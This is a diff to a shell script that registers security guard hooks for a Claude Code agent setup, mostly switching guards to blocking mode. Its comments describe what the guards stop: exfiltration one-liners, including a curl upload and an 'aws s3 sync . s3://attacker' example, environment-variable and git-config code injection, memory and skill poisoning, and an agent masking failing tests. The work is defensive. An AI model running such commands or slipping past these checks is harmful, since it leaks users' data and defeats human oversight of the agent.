@@ -58,7 +58,7 @@ get_hooks_for_mode() {
   # regex metachar, so CC keeps this matcher in EXACT-LIST mode and it never matched
   # the longer MCP resource-read tool names. Spelled out rather than left to a regex,
   # so the coverage is declared instead of incidental.
-  hooks+=("PreToolUse|Read,ReadMcpResourceTool,ReadMcpResourceDirTool,Grep,Glob|${hooks_dir}/env-file-guard.sh|")
+  hooks+=("PreToolUse|Read,ReadMcpResourceTool,ReadMcpResourceDirTool,Grep,Glob|${hooks_dir}/env-file-guard.sh|block")
   # v2.23.6: Bash-channel self-defense. path-guard covers the Write/Edit channel and
   # safety.sh's selfmod blocks Bash edits to the config FILES; this closes the two
   # remaining gaps — `claude --dangerously-skip-permissions`/bypassPermissions, and
@@ -69,15 +69,15 @@ get_hooks_for_mode() {
   # DB-migration, or auth files (guardrails.md's documented review triggers). Emits
   # permissionDecision "ask" — not a hard block; asks once per file per session.
   # Fast-path exits before sourcing libs on any non-critical path.
-  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/critical-infra-guard.sh|")
+  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/critical-infra-guard.sh|block")
   # Read-only mode (/sc-readonly): time-boxed "look, don't touch". Near-zero overhead
   # when off (fast-path exits before parsing). A PreToolUse deny → beats autopilot's
   # auto-approve automatically (tighten > loosen).
-  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit,Bash,Monitor,PowerShell|${hooks_dir}/readonly-guard.sh|")  # v2.7.2: block memory-poisoning writes (OWASP ASI06). Persistent memory is
+  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit,Bash,Monitor,PowerShell|${hooks_dir}/readonly-guard.sh|block")  # v2.7.2: block memory-poisoning writes (OWASP ASI06). Persistent memory is
   # auto-loaded every SessionStart, so a poisoned write compromises all future
   # sessions — must be in safe mode, not just full.
-  hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/memory-write-guard.sh|")
-  hooks+=("PreToolUse|Bash,Monitor,PowerShell,WebFetch|${hooks_dir}/tool-preferences.sh|")  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/code-security-scanner.sh|asyncRewake")
+  hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/memory-write-guard.sh|block")
+  hooks+=("PreToolUse|Bash,Monitor,PowerShell,WebFetch|${hooks_dir}/tool-preferences.sh|")  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/code-security-scanner.sh|asyncRewake,block")
   # v2.23.5: a Jupyter cell shells out through the kernel (!cmd, %%bash, %pip,
   # os.system, subprocess) and never hits the Bash matcher — safety.sh never sees
   # it. Route the cell's shell content through safety.sh (parity, no drift) and ask
@@ -102,24 +102,26 @@ get_hooks_for_mode() {
   # through the native CLI (aws/gcloud/az/kubectl/helm/gsutil/doctl/flyctl) where
   # safety.sh only guards cloud credential-theft/escape, not bulk deletes. ASK on
   # terminate/delete/uninstall/rm-r. Disable: SUPERCHARGER_CLOUD_CLI_GUARD=0.
-  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/cloud-cli-destructive-guard.sh|")  # v2.23.19: whole-tree exfil that carries NO sensitive-name token — safety-detect's
+  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/cloud-cli-destructive-guard.sh|block")  # v2.23.19: whole-tree exfil that carries NO sensitive-name token — safety-detect's
   # upload arms are gated on _SENSITIVE_PATHS, so `tar czf - . | curl --data-binary @-`,
   # `aws s3 sync . s3://attacker`, `rsync -a . host:` slip through. ASK on the SHAPE
   # (archive-to-network-sink, or whole cwd/root/home sync to remote). Anchored so local
   # archives + build-dir deploys pass. /profile-gated. Disable: SUPERCHARGER_BULK_EXFIL_GUARD=0.
-  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/bulk-exfil-guard.sh|")  # v2.23.21: `git config`/`git -c` setting an EXEC-CAPABLE key (core.fsmonitor,
+  # Asks before a recursive rm deletes unsaved (untracked, not ignored) files; the prompt says how many.
+  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/blast-radius-guard.sh|")
+  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/bulk-exfil-guard.sh|block")  # v2.23.21: `git config`/`git -c` setting an EXEC-CAPABLE key (core.fsmonitor,
   # sshCommand, credential.helper, pager/editor, alias '!sh', filter clean/smudge,
   # diff/difftool/mergetool cmd, persistent hooksPath) → RCE on the next git op
   # (CVE-2026-55607 + credential-helper cluster). git-safety blocks only the inline
   # `-c core.hooksPath=` form. ASK (DENY fsmonitor + command-valued sshCommand);
   # value-shape gated so credential.helper=store/core.pager=less pass. /profile-gated.
   # Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0.
-  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/git-config-exec-guard.sh|")  # v2.23.24: code-injecting env var (LD_PRELOAD, DYLD_INSERT_LIBRARIES, BASH_ENV,  # NODE_OPTIONS --require, PYTHONSTARTUP, GIT_SSH_COMMAND, PERL5OPT/RUBYOPT, …) →
+  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/git-config-exec-guard.sh|block")  # v2.23.24: code-injecting env var (LD_PRELOAD, DYLD_INSERT_LIBRARIES, BASH_ENV,  # NODE_OPTIONS --require, PYTHONSTARTUP, GIT_SSH_COMMAND, PERL5OPT/RUBYOPT, …) →
   # exec on the NEXT process spawn, sidestepping command-pattern guards. safety.sh
   # doesn't cover the env-preload class. ASK, value-shape gated (NODE_OPTIONS=
   # --max-old-space-size / LD_LIBRARY_PATH=/usr/local/lib pass). /profile-gated.
   # Disable: SUPERCHARGER_ENV_EXEC_GUARD=0.
-  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/env-exec-guard.sh|")  # v2.7.49: block credential-harvesting Elicitation forms — an MCP server asking
+  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/env-exec-guard.sh|block")  # v2.7.49: block credential-harvesting Elicitation forms — an MCP server asking
   # for a password/token/api-key in a routine-looking form. Declines when the
   # schema has credential-style fields and the server isn't in
   # trustedElicitationServers (.supercharger.json). SYNC — must run to block.
@@ -144,7 +146,7 @@ get_hooks_for_mode() {
   # this on Bash and mcp-egress-guard on MCP; this is the un-mirrored WebFetch
   # sibling (cross-channel parity). Only fires on WebFetch/WebSearch → ~zero hot-path
   # cost. Fail-open. Disable: SUPERCHARGER_WEBFETCH_EGRESS=0.
-  hooks+=("PreToolUse|WebFetch,WebSearch,Monitor|${hooks_dir}/webfetch-egress-guard.sh|")
+  hooks+=("PreToolUse|WebFetch,WebSearch,Monitor|${hooks_dir}/webfetch-egress-guard.sh|block")
   # v2.9.17: +mcp__ matcher — MCP tool RESPONSES were never secret-scanned (real
   # channel gap; a server can return a leaked credential). (from efij Stallion)
   # +WebFetch,WebSearch — fetched pages/results were never secret-scanned either.
@@ -160,13 +162,13 @@ get_hooks_for_mode() {
   #
   # Base set, not full: its three sibling channels are here, and channel parity is
   # the whole point. ASK, not deny — writing a key file is legitimate work.
-  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/write-secret-guard.sh|")
+  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/write-secret-guard.sh|block")
   # v2.26.44: Artifact publishes a local file to a hosted URL — content leaving
   # the machine, irreversibly. None of the exfil guards matched it (they cover
   # Bash/MCP/WebFetch), and output-secrets-scanner is PostToolUse, i.e. after the
   # publish. PreToolUse so the check happens before anything is sent.
   # ShareOnboardingGuide uploads ./ONBOARDING.md to an org share link: same egress.
-  hooks+=("PreToolUse|Artifact,ArtifactComments,ArtifactData,ShareOnboardingGuide|${hooks_dir}/artifact-publish-guard.sh|")
+  hooks+=("PreToolUse|Artifact,ArtifactComments,ArtifactData,ShareOnboardingGuide|${hooks_dir}/artifact-publish-guard.sh|block")
   # Plugin-only first-run seeder: writes role/tier/mcp-profile scope files from
   # userConfig (CLAUDE_PLUGIN_OPTION_*) — the plugin equivalent of the installer
   # wizard. Runs first so later SessionStart hooks see the seeded files. No-ops
@@ -176,6 +178,8 @@ get_hooks_for_mode() {
   # python3. Missing, the guards degrade silently. Warns once per missing-set,
   # on both channels (a classic install can lose a dependency later too).
   hooks+=("SessionStart||${hooks_dir}/dependency-preflight.sh|")
+  # Every mode: a guard that cannot run lets every call through, silently.
+  hooks+=("SessionStart||${hooks_dir}/guard-drift-alarm.sh|")
   hooks+=("SessionStart||${hooks_dir}/plugin-config-seed.sh|")
   # v2.26.0: writes the three settings.json keys a plugin cannot declare (statusLine,
   # env.ENABLE_PROMPT_CACHING_1H, attribution). A hook can do this because hooks are
@@ -219,37 +223,37 @@ get_hooks_for_mode() {
     # lockfile (package-lock/yarn.lock/Cargo.lock/go.sum/…) — regenerate via the
     # package manager instead. Once per lockfile per session. Disable:
     # SUPERCHARGER_LOCKFILE_GUARD=0.
-    hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/lockfile-integrity-guard.sh|")
+    hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/lockfile-integrity-guard.sh|block")
     # v2.23.9: supply-chain sibling of the lockfile guard — ASK when a manifest edit
     # adds/changes an install-time lifecycle script (package.json postinstall/prepare/…
     # or setup.py install-time exec), esp. one that reaches the network or evals code.
     # Runs on the next install → persistence vector. Disable: SUPERCHARGER_INSTALL_SCRIPT_GUARD=0.
-    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/install-script-guard.sh|")
+    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/install-script-guard.sh|block")
     # v2.23.25: `.pth` persistence — CPython exec's any `import`-prefixed line in a
     # .pth on interpreter startup (survives uninstall). DENY a .pth import line with
     # a shell/network primitive (os.system/subprocess/socket/urllib), ASK on softer
     # exec/eval/__import__. Bare-path + sys.path-finder .pth pass. install-script-guard
     # covers package.json/setup.py only. Disable: SUPERCHARGER_PTH_GUARD=0.
-    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/pth-persistence-guard.sh|")
+    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/pth-persistence-guard.sh|block")
     # v2.23.14: supply-chain sibling — ASK when a manifest edit adds/changes a dep
     # from a NON-REGISTRY source (tarball/wheel URL, git+/github: shorthand, file:/
     # local path, or a registry-override index → dependency confusion). install-script
     # guards lifecycle scripts, lockfile guards the hash, dep-vuln audits known CVEs;
     # the dep ORIGIN was unguarded and runs before any CVE scan. Asks once per source
     # per session. Disable: SUPERCHARGER_PACKAGE_SOURCE_GUARD=0.
-    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/package-source-guard.sh|")
-    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/package-source-guard.sh|")
+    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/package-source-guard.sh|block")
+    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/package-source-guard.sh|block")
     # v2.23.4: test-integrity guard — ASK before an edit to a test file removes
     # assertions or adds skip/only markers (it.skip, @pytest.mark.skip, @Ignore,
     # t.Skip, xit, .only, #[ignore]). Defends the Verification Gate against an
     # agent gaming the tests to go green. Disable: SUPERCHARGER_TEST_INTEGRITY_GUARD=0.
-    hooks+=("PreToolUse|Edit,MultiEdit,Write|${hooks_dir}/test-integrity-guard.sh|")
+    hooks+=("PreToolUse|Edit,MultiEdit,Write|${hooks_dir}/test-integrity-guard.sh|block")
     # v2.23.20: test-mask guard — the Bash-channel sibling of test-integrity-guard.
     # ASK when a verification runner's EXIT status is masked (`pytest || true`,
     # `npm test || echo ok`, `make test; exit 0`) so a failing check reports green.
     # test-integrity guards test-FILE edits; this guards the command exit-mask that
     # defeats the same Verification Gate. Disable: SUPERCHARGER_TEST_MASK_GUARD=0.
-    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/test-mask-guard.sh|")    # v2.23.27: editing a GENERATED file (dist/build/__generated__, *_pb2.py, *.pb.go,    # *.min.js, or a @generated/DO NOT EDIT header) is wasted work — wiped on the next
+    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/test-mask-guard.sh|block")    # v2.23.27: editing a GENERATED file (dist/build/__generated__, *_pb2.py, *.pb.go,    # *.min.js, or a @generated/DO NOT EDIT header) is wasted work — wiped on the next
     # codegen/build. ASK to redirect the edit to the source. Disable: SUPERCHARGER_GENERATED_FILE_GUARD=0.
     hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/generated-file-guard.sh|")
     # v2.23.28: hallucinated LOCAL relative import (`./services/email` when the file
@@ -270,19 +274,19 @@ get_hooks_for_mode() {
     # v2.23.34: raw ANSI content-hiding escape (ESC[8m conceal / ESC]8;; OSC-8) written
     # into a file — ASK. Hidden-instruction / output-spoof trap. Fixtures/docs skipped.
     # Disable: SUPERCHARGER_ANSI_ESCAPE_GUARD=0.
-    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/ansi-escape-guard.sh|")
+    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/ansi-escape-guard.sh|block")
     # v2.23.41: GitHub Actions "pwn request" — a pull_request_target/workflow_run workflow
     # that checks out the untrusted PR head runs fork code with the repo's secrets. DENY
     # the allow-unsafe-pr-checkout:true opt-out, ASK the trigger+PR-head-checkout combo.
     # Disable: SUPERCHARGER_WORKFLOW_PWN_GUARD=0.
-    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/workflow-pwn-guard.sh|")
+    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/workflow-pwn-guard.sh|block")
     # v2.9.6: reactive MCP circuit-breaker — PostToolUse trips on 429/503/etc,
     # PreToolUse blocks calls to that server during cooldown. Default ON, fail-open.
     hooks+=("PreToolUse|mcp__|${hooks_dir}/mcp-circuit-breaker.sh|")
     hooks+=("PostToolUse|mcp__|${hooks_dir}/mcp-circuit-breaker.sh|async")
     # v2.9.17: classify URLs in MCP tool args — block metadata-SSRF / webhook /
     # paste-site egress, warn on private-network targets. (from efij Stallion)
-    hooks+=("PreToolUse|mcp__|${hooks_dir}/mcp-egress-guard.sh|")
+    hooks+=("PreToolUse|mcp__|${hooks_dir}/mcp-egress-guard.sh|block")
     # v4.2.0: sync, so an opt-in terminalSequence (SUPERCHARGER_NOTIFY_MODE) is read;
     # an async hook's output fields are dropped. Rare events, fired while idle.
     hooks+=("Notification|idle_prompt|${hooks_dir}/notify.sh|")
@@ -312,11 +316,11 @@ get_hooks_for_mode() {
     hooks+=("PreToolUse|ExitWorktree|${hooks_dir}/exitworktree-guard.sh")    # Git remote exfil guard: git-safety checks HOW you push; this checks WHERE —    # asks before pushing the whole repo to a non-origin host or hijacking origin's
     # URL to a foreign host (whole-repo exfiltration). Ask (not deny) — forks/mirrors
     # are legit — once per host per session. Disable: SUPERCHARGER_GIT_REMOTE_GUARD=0.
-    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/git-remote-guard.sh")    # Redirect clobber guard: the Write/Edit review path is guarded, but a Bash    # redirect (`echo x > app.ts`, `sed -i`, `tee`) overwrites tracked source and
+    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/git-remote-guard.sh|block")    # Redirect clobber guard: the Write/Edit review path is guarded, but a Bash    # redirect (`echo x > app.ts`, `sed -i`, `tee`) overwrites tracked source and
     # bypasses ALL of it. Asks (not deny) ONLY when the target is git-tracked, once
     # per file per session. Fork-free fast-path; parser in redirect-clobber-detect.py.
     # Disable: SUPERCHARGER_REDIRECT_CLOBBER_GUARD=0.
-    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/redirect-clobber-guard.sh|")    # v2.14.3: consolidated commit guard — ONE hook runs three self-gating checks on
+    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/redirect-clobber-guard.sh|block")    # v2.14.3: consolidated commit guard — ONE hook runs three self-gating checks on
     # `git commit`: secret-in-staged-diff (default on), Co-Authored-By trailer (opt-in),
     # and Conventional Commit format (opt-in via .conventional-commits). Merged from
     # three separate hooks (commit-secret-guard/commit-coauthor-guard/commit-check) to
@@ -364,17 +368,17 @@ get_hooks_for_mode() {
     hooks+=("PostToolUse|Bash|${hooks_dir}/package-credibility-guard.sh|async")
     hooks+=("PostToolUse|Bash,Read|${hooks_dir}/repetition-detector.sh|")
     hooks+=("PreToolUse|Agent|${hooks_dir}/agent-gate.sh|")
-    hooks+=("PreToolUse|Skill|${hooks_dir}/skill-poisoning-scanner.sh|")
+    hooks+=("PreToolUse|Skill|${hooks_dir}/skill-poisoning-scanner.sh|block")
     # Change detection, not classification: the scanner asks whether a skill
     # LOOKS malicious against a fixed pattern list, this asks whether it is the
     # same file as last time. A skill that passed the patterns yesterday passes
     # them today after an upstream edit, and a skill is instructions Claude
     # follows. Trust on first use; see docs/SKILLS-LOCK-PLAN.md.
-    hooks+=("PreToolUse|Skill|${hooks_dir}/skill-integrity-guard.sh|")
+    hooks+=("PreToolUse|Skill|${hooks_dir}/skill-integrity-guard.sh|block")
     # v2.26.40: the same inspection for agent definitions. Skills had a load-time
     # scanner since v2.7.x; ~/.claude/agents/*.md had none, though it is the same
     # thing — instructions Claude follows, loaded by name, persistent on disk.
-    hooks+=("PreToolUse|Agent|${hooks_dir}/agent-poisoning-scanner.sh|")
+    hooks+=("PreToolUse|Agent|${hooks_dir}/agent-poisoning-scanner.sh|block")
     # v2.26.76: Workflow runs a script that spawns subagents — the Agent channel's
     # capability without the Agent channel's three guards. Blocking, not async: it
     # must decide before the fan-out starts.
@@ -382,7 +386,7 @@ get_hooks_for_mode() {
     # v2.26.77: SendMessage moves free text to other sessions and other MACHINES.
     # The tool's own description forbids using it to launder a blocked action past
     # the permission layer, but states it as an instruction with no mechanism.
-    hooks+=("PreToolUse|SendMessage|${hooks_dir}/sendmessage-guard.sh|")
+    hooks+=("PreToolUse|SendMessage|${hooks_dir}/sendmessage-guard.sh|block")
     # v2.26.78: +ScheduleWakeup. It is the same "make this run again later"
     # capability as Cron*, from the /loop dynamic-pacing path, and was unobserved.
     # The hook is schema-agnostic (it dumps tool_input verbatim), so this needs no
@@ -496,6 +500,10 @@ get_hooks_for_mode() {
     # correct event and covers strictly more — a plain cd into any repo, not just a
     # new worktree.
     hooks+=("CwdChanged|*|${hooks_dir}/config-weakening-notice.sh|")
+    hooks+=("SessionStart||${hooks_dir}/config-weakening-notice.sh|")
+    # Work still running when a session ended (Stop snapshot), named at the next start.
+    hooks+=("Stop|*|${hooks_dir}/unfinished-work.sh|async")
+    hooks+=("SessionStart||${hooks_dir}/unfinished-work.sh|")
     # v2.26.43 registered dir-added-record.sh on `DirectoryAdded` to honour
     # Claude Code's own `/add-dir`. THERE IS NO SUCH EVENT. Claude Code names the
     # valid set in its own error, and DirectoryAdded is not among them:
@@ -567,7 +575,7 @@ get_hooks_for_mode() {
     # no dispatcher. Asks before an up-tier switch once half a set budget is spent.
     hooks+=("PreModelSwitch||${hooks_dir}/budget-cap.sh check|")
     hooks+=("PreToolUse||${hooks_dir}/tool-call-limiter.sh|")
-    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/human-approval-gate.sh|")    hooks+=("PreToolUse|Agent|${hooks_dir}/cost-forecast.sh|")
+    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/human-approval-gate.sh|block")    hooks+=("PreToolUse|Agent|${hooks_dir}/cost-forecast.sh|")
     hooks+=("SubagentStart||${hooks_dir}/subagent-cost.sh start|async")
     hooks+=("SubagentStop||${hooks_dir}/subagent-cost.sh stop|")
     if [[ "$has_developer" == "true" ]]; then
